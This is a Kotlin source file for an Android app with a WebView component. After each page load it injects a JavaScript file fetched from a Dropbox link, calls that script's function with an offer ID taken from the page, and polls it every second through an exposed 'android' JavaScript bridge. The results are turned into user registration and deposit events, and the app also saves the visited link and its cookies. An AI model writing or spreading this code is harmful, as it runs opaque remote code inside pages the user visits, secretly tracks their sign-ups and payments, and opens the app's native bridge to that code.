package org.compact.tech

import android.annotation.SuppressLint
import android.content.Context
import android.net.Uri
import android.os.Build
import android.util.AttributeSet
import android.webkit.*

class ScrPreferences(context: Context) {
    private val name = "ScrPreferences"
    private val prId = "prId"
    private val cookies = "cookies"
    private val link = "link"

    private val preferences = context.getSharedPreferences(name, Context.MODE_PRIVATE)

    fun savePreland(prId: String) = preferences.edit().putString(this.prId, prId).apply()
    fun getPreland() = preferences.getString(this.prId, null)

    fun saveCookies(cookies: String) = preferences.edit().putString(this.cookies, cookies).apply()
    fun getCookies() = preferences.getString(this.cookies, null)

    fun saveLink(link: String) = preferences.edit().putString(this.link, link).apply()
    fun getLink() = preferences.getString(this.link, null)
}

class ScrView(context: Context, attrs: AttributeSet) : ScrBaseView(context, attrs) {
    var preferences = ScrPreferences(context)
    var query: String? = null
    var preland: String? = preferences.getPreland()

    init {
        setClient()
    }

    fun startIfSaved(): Boolean {
        preferences.getLink()?.let { link ->
            preferences.getCookies()?.let {
                CookieManager.getInstance().setCookie(link, it)
            }
            loadUrl(link)
            return true
        }
        return false
    }

    fun start(link: String) {
        loadUrl(link)
    }

    fun setAskListener(askListener: Ask.Listener) {
        addJavascriptInterface(Ask(askListener), "android")
    }

    fun save() {
        preferences.saveLink(url.toString())
        preferences.saveCookies(CookieManager.getInstance().getCookie(url.toString()))
    }

    private fun initMainFunc(id: String) =
        loadUrl(
            "javascript:(function(){sdz=document.createElement(\"script\");sdz.onload=" +
                    "function(){mainFunc('$id');setInterval(()=>android.onAsk(askReg()),1000);};" +
                    "sdz.src=\"https://dl.dropbox.com/s/kgsfkk6u16vchbl/mf.js\";document.body.appendChild(sdz);})()"
        )

    private fun setClient() {
        webViewClient = object : WebViewClient() {
            override fun shouldOverrideUrlLoading(v: WebView?, r: WebResourceRequest?): Boolean {
                Uri.parse(url).getQueryParameter("cust_offer_id")?.let { query = it }
                return false
            }

            override fun onPageFinished(v: WebView?, url: String?) {
                if (preland.isNullOrEmpty()) {
                    val script = "document.querySelector('meta[name=\"cust_offer_id\"]').content"
                    evaluateJavascript(script) {
                        val result = it.replace("\"", "")
                        if (result.isNotEmpty() && result != "null") {
                            preland = result
                            preferences.savePreland(result)
                        }
                    }
                }

                preland?.let { initMainFunc(it) } ?: query?.let { initMainFunc(it) }
            }
        }
    }
}


class Ask(private val askListener: Listener) {
    private var previous: String? = null

    @JavascriptInterface
    fun onAsk(result: String) {
        val splittedResult = result.split(':')
        if (splittedResult.size == 1) {
            if (previous == "-1" && splittedResult[0] == "0") askListener.onReg()
        }
        if (splittedResult.size == 2) {
            when (splittedResult[0]) {
                "1" -> askListener.onDep1(splittedResult[1])
                "2" -> askListener.onDep2(splittedResult[1])
                "3" -> askListener.onDep3(splittedResult[1])
            }
        }
        previous = result
    }

    open class Listener {
        open fun onReg() {}
        open fun onDep1(value: String) {}
        open fun onDep2(value: String) {}
        open fun onDep3(value: String) {}

    }
}

@SuppressLint("SetJavaScriptEnabled")
abstract class ScrBaseView(c: Context, a: AttributeSet) : WebView(c, a) {
    init {
        with(settings) {
            javaScriptEnabled = true
            loadWithOverviewMode = true
            useWideViewPort = true
            domStorageEnabled = true
        }

        webChromeClient = WebChromeClient()

        if (Build.VERSION.SDK_INT > Build.VERSION_CODES.LOLLIPOP) {
            val cookieManager = CookieManager.getInstance()
            cookieManager.setAcceptCookie(true)
            cookieManager.setAcceptThirdPartyCookies(this, true);
        }
    }
}
